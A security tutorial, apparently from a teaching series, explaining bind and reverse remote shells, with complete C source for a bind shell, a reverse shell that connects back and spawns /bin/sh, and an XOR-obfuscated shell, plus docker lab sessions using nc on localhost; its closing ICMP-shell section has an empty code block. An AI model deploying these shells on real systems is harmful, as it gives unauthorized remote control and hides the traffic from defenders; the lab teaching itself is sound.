# Remote shell

From a security point of view, a remote shell is usually part of a shellcode to enable unauthorized remote access to a system. This tutorial is heavily based in [1], [2], [3] and [4].

----

**Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
```bash
docker build -t basic_cybersecurity5:latest .
```
and runned with:
```bash
docker run --privileged -it basic_cybersecurity5:latest
```

----

The content used for this tutorial will be touching into remote shells.

According to [1], there are basically two ways to get remote shell access:

- **Direct Remote Shells**. A direct remote shell behaves as a server. It works like a ssh or telnet server. The remote user/attacker, connects to a specific port on the target machine and gets automatically access to a shell.
- **Reverse Remote Shells**. These ones work the other way around. The application running on the target machine connects back (calls back home) to a specific server and port on a machine that belongs to the user/attacker.

The *Reverse Shell* method has some advantages:

- Firewalls usually block incoming connections, but they allow outgoing connection in order to provide Internet access to the machine’s users.
- The user/attacker does not need to know the IP of the machine running the remote shell, but s/he needs to own a system with a fixed IP, to let the target machine call home.
- Usually there are many outgoing connections in a machine and only a few servers (if any) running on it. This makes detection a little bit harder, specially if the shell connects back to something listening on port 80…

Let's write a client and a server that will allow us to explore both  methods:

### The client
```C
#include <stdio.h>
#include <stdlib.h>  
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}
```

The function receives as parameters an IP address to connect to and a port. Then it creates a TCP socket (SOCK_STREAM) and fills in the data for connecting. The connection is effectively established after a successful execution of connect. In case of any error (creating the socket or connection) we just stop the application.

This function will allow us to implement a reverse remote shell. Client continues as:

```C
int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);

  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}
```

the function `start_shell` is pretty simple. It makes use of two system calls dup2 and execv. The first one duplicates a given file descriptor. In this case, the three calls at the beginning of the function, assigns the file descriptor received as parameter to the Standard Input (file descriptor 0), Standard Output (file descriptor 1) and Standard Error (file descriptor 3).

So, if the file descriptor we pass as a parameter is one of the sockets created with our previous client and server functions, we are effectively sending and receiving data through the network every time we write data to the console and we read data from stdin.

Now we just execute a shell with the -i flag (interactive mode). The execv system call will substitute the current process (whose stdin,stdout and stderr are associated to a network connection) by the one passed as parameter.

And finally, main, self-explanatory:

```C
int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  start_shell (client_init (argv[1], atoi(argv[2])));
  return 0;
}
```

### The server

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int
server_init (int port)
{
  int                s, s1;
  socklen_t          clen;
  struct sockaddr_in serv, client;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);

  if ((bind (s, (struct sockaddr *)&serv,
	     sizeof(struct sockaddr_in))) < 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }
  if ((listen (s, 10)) < 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &client,
		    &clen)) < 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}
```
the beginning of the function is practically the same that for the client code. It creates a socket, fills in the network data, but instead of trying to connect to a remote server, it binds the socket to a specific port. Note that the address passed to bind is the constant INADDR_ANY. This is actually IP 0.0.0.0 and it means that the socket will be listening on all interfaces.

The bind system call does not really make the socket a listening socket (you can actually call bind on a client socket). It is the listen system call the one that makes the socket a server socket. The second parameter passed to listen is the backlog. Basically it indicates how many connections will be queued to be accepted before the server starts rejecting connections. In our case it just do not really matter.

At this point, our server is setup and we can accept connections. The call to the accept system call will make our server wait for an incoming connection. Whenever it arrives a new socket will be created to interchange data with the new client.

Similar to the client, we also include `start_shell` and `main` as follows:

```C
int
start_shell (int s)
{
  char *name[3] ;

  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);

  name[0] = "/bin/sh";
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (1);

  return 0;
}

int
main (int argc, char *argv[])
{
  /* FIXME: Check command-line arguments */
  start_shell (server_init (atoi(argv[1])));
  return 0;
}
```

### Direct Remote Shell
```bash
# terminal 1
docker run --privileged -it basic_cybersecurity5:latest
root@7e837bd2c6b2:~# ./server 5000


# terminal 2
# we figure out the running docker container's ID
docker ps
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES
7e837bd2c6b2        basic_cybersecurity5:latest   "bash"              24 seconds ago      Up 23 seconds                           ecstatic_golick
# get a shell into the container
$ docker exec -it 7e837bd2c6b2 bash
# get a direct remote shell
root@7e837bd2c6b2:~# nc 127.0.0.1 5000
# ls
checksec.sh
client
client.c
rp++
server
server.c
# uname -a
Linux 7e837bd2c6b2 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

or running server in the docker container and client in the host machine:
```
# terminal 1
docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
root@81bffa48f8a3:~# ./server 5000


# terminal 2
nc localhost 5000
$ nc localhost 5000
# uname -a
Linux 81bffa48f8a3 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
#
```
Note that we had to map port 5000 between docker and the host OS.

### Reverse Remote Shells
```bash
# terminal 1
$ docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
root@812b61f0f7cc:~# nc -l -p 5000

# terminal 2
docker ps
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
812b61f0f7cc        basic_cybersecurity5:latest   "bash"              3 seconds ago       Up 6 seconds        0.0.0.0:5000->5000/tcp   reverent_haibt
docker exec -it 812b61f0f7cc bash
root@812b61f0f7cc:~#
root@812b61f0f7cc:~# ./client 127.0.0.1 5000

# terminal 1
uname -a
Linux 812b61f0f7cc 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

### Encrypted remote shell

Following from previous code and taking inspiration from [4], we will extend the previous example to encrypt the data stream.

To begin with, as nicely explained at [4]:

>In order to crypt our communication, we need something in front of the shell that gets the data from/to the network and crypts/decrypts it. This can be done in many different ways.
>
>This time we have choose to launch the shell as a separated child process and use a socketpair to transfer the data received/sent through the network to the shell process. The father process will then crypt and decrypt the data going into/coming from the network/shell. This may look a bit confusing at first glance, but that is just because of my writing :).
>
>A socketpair is just a pair of sockets that are immediately connected. Something like running the client and server code in just one system call. Conceptually they behave as a pipe but the main difference is that the sockets are bidirectional in opposition to a pipe where one of the file descriptors is read only and the other one is write only.
>
>`socketpairs` are a convenient IPC (InterProcess Communication) mechanism and fits pretty well in our network oriented use case... because they are sockets after all.

Code for crypting and de-crypting the communications over a remote shell is presented (and commented) below:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

// Creates a socket, fills in the network data and binds the socket
// to a specific port given as a parameter.
//
// Note that the address passed to bind is the constant INADDR_ANY.
// This is actually IP 0.0.0.0 and it means that the socket will be
// listening on all interfaces.
//
// Returns file descriptor of the accepted connection.
int
server_init (int port)
{
        int s, s1;
        socklen_t clen;
        struct sockaddr_in serv, client;

        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror ("socket:");
                exit (EXIT_FAILURE);
        }

        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = htonl(INADDR_ANY);

        if ((bind (s, (struct sockaddr *)&serv,
                   sizeof(struct sockaddr_in))) < 0)
        {
                perror ("bind:");
                exit (EXIT_FAILURE);
        }

        if ((listen (s, 10)) < 0)
        {
                perror ("listen:");
                exit (EXIT_FAILURE);
        }
        clen = sizeof(struct sockaddr_in);
        if ((s1 = accept (s, (struct sockaddr *) &client,
                          &clen)) < 0)
        {
                perror ("accept:");
                exit (EXIT_FAILURE);
        }
        return s1;

}

// Receives as parameters an IP address to connect to
// and a port. Then it creates a TCP socket (SOCK_STREAM)
// and fills in the data for connecting. The connection
// is effectively established after a successful execution
// of connect. In case of any error (creating the socket or
// connection) we just stop the application.
//
// Returns the file descriptor from where to send/receive
// client data
int
client_init (char *ip, int port)
{
        int s;
        struct sockaddr_in serv;

        printf ("+ Connecting to %s:%d\n", ip, port);

        if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror ("socket:");
                exit (EXIT_FAILURE);
        }

        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = inet_addr(ip);

        if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0)
        {
                perror("connect:");
                exit (EXIT_FAILURE);
        }

        return s;
}


// Function that allow us to implement a reverse remote shell.
//
// It makes use of two system calls dup2 and execv. The first one
// duplicates a given file descriptor. In this case, the three
// calls at the beginning of the function, assigns the file
// descriptor received as parameter to the Standard Input (file
//  descriptor 0), Standard Output (file descriptor 1) and
// Standard Error (file descriptor 3).
//
// If the file descriptor we pass as a parameter is one of the
// sockets created with our previous client and server functions,
// we are effectively sending and receiving data through the
// network every time we write data to the console and we read data
// from stdin.
int
start_shell (int s)
{
        char *name[3];

        printf ("+ Starting shell\n");
        dup2 (s, 0);
        dup2 (s, 1);
        dup2 (s, 2);

        name[0] = "/bin/sh";
        name[1] = "-i";
        name[2] = NULL;
        execv (name[0], name );
        exit (1);

        return 0;
}


// This function decode the information received from the network sends
// it to the shell using the counterpart socket (from the socketpair)
// system call.
//
// At the same time, whenever the shell produces some output, this function
// will read that data, crypt it and send it over the network.
//
// Receives as parameters two file descriptors, one representing the
// socketpair end for communications with the shell (s1) and the
// other for networking (s).
void
async_read (int s, int s1)
{
        fd_set rfds;
        struct timeval tv;
        int max = s > s1 ? s : s1;
        int len, r;
        char buffer[1024];

        max++;
        while (1)
        {
                // macros to initialize the file descriptor set
                FD_ZERO(&rfds);
                FD_SET(s,&rfds);
                FD_SET(s1,&rfds);

                /* Time out. */
                // set to 1 second
                // microseconds resolution
                tv.tv_sec = 1;
                tv.tv_usec = 0;

                // standard select loop for a network application.
                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
                {
                        perror ("select:");
                        exit (EXIT_FAILURE);
                }
                else if (r > 0) /* If there is data to process */
                {

                  // The memfrob function does a XOR crypting with
                  // key (42). The greatest thing about XOR crypting is that the
                  // same function can be used for crypt and decrypt. Other than
                  // that, with a 1 byte long key (42 in this case) it is pretty
                  // useless.
                        if (FD_ISSET(s, &rfds))
                        {
                                // get data in our network socket, we just read the data,
                                // decrypt it and resend it to our shell.
                                memset (buffer, 0, 1024);
                                if ((len = read (s, buffer, 1024)) <= 0) exit (1);
                                memfrob (buffer, len);

                                write (s1, buffer, len);
                        }
                        if (FD_ISSET(s1, &rfds))
                        {
                                // get data from our shell, we read it, we crypt it and
                                // we send it back to the network client.
                                memset (buffer, 0, 1024);
                                if ((len = read (s1, buffer, 1024)) <= 0) exit (1);

                                memfrob (buffer, len);
                                write (s, buffer, len);
                        }
                }
        }
}

// Set up the socket pair and create a new process (using fork)
//
// Function creates a socket pair using the syscall socketpair).
// The fork system call creates a new process as an identical image
// that make use of the sp socketpair to communicate both processes.
//
// Instead of feeding data into our shell directly from the network,
// function is used to send/receive data using the counterpart socket
// provided by socketpair.
void
secure_shell (int s)
{
        pid_t pid;
        int sp[2];

        /* Create a socketpair to talk to the child process */
        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
        {
                perror ("socketpair:");
                exit (1);
        }

        /* Fork a shell */
        if ((pid = fork ()) < 0)
        {
                perror ("fork:");
                exit (1);
        }
        else
        if (!pid) /* Child Process */
        {
                close (sp[1]);
                close (s);

                start_shell (sp[0]);
                /* This function will never return */
        }

        /* At this point we are the father process */
        close (sp[0]);

        printf ("+ Starting async read loop\n");
        async_read (s, sp[1]);

}

int
main (int argc, char *argv[])
{
        /* FIXME: Check command-line arguments */
        if (argv[1][0] == 'c')
                secure_shell (client_init (argv[2], atoi(argv[3])));
        else if (argv[1][0] == 's')
                secure_shell (server_init (atoi(argv[2])));
        else if (argv[1][0] == 'a')
                async_read (client_init (argv[2], atoi(argv[3])), 0);
        else if (argv[1][0] == 'b')
                async_read (server_init (atoi(argv[2])), 0);


        return 0;
}
```

Let's try it out:

```bash
# In one terminal
docker run --privileged -p 5000:5000 -it basic_cybersecurity5:latest
root@ab97f27ecde6:~# ./crypt_shell s 5000

# In the other terminal
$ docker ps
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS                    NAMES
ab97f27ecde6        basic_cybersecurity5:latest   "bash"              2 minutes ago       Up 2 minutes        0.0.0.0:5000->5000/tcp   pedantic_lamarr
victor at Victors-MacBook in ~/basic_cybersecurity/tutorial5 on master*
$ docker exec -it ab97f27ecde6 bash
root@ab97f27ecde6:~# ./crypt_shell a 127.0.0.1 5000
+ Connecting to 127.0.0.1:5000
# uname -a
Linux ab97f27ecde6 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
#
```

### Remote shell through ICMP

The following content is based on [3]. The idea is to use an unusual communication channel with our remote shell. In particular, we'll be using ICMP packets to transfer the shell data and commands between the two machines. The method described here generates an unusual ICMP traffic that may fire some alarms however it all depends on the scenario.

The technique is actually pretty simple (and old). In a nutshell, we aim to:

- Change our client/server sockets into a RAW socket
- Write a sniffer to capture ICMP traffic
- Write a packet injector to send ICMP messages

The complete source code has been commented for readibility and is presented below. It should be self-explanatory:

```C

```
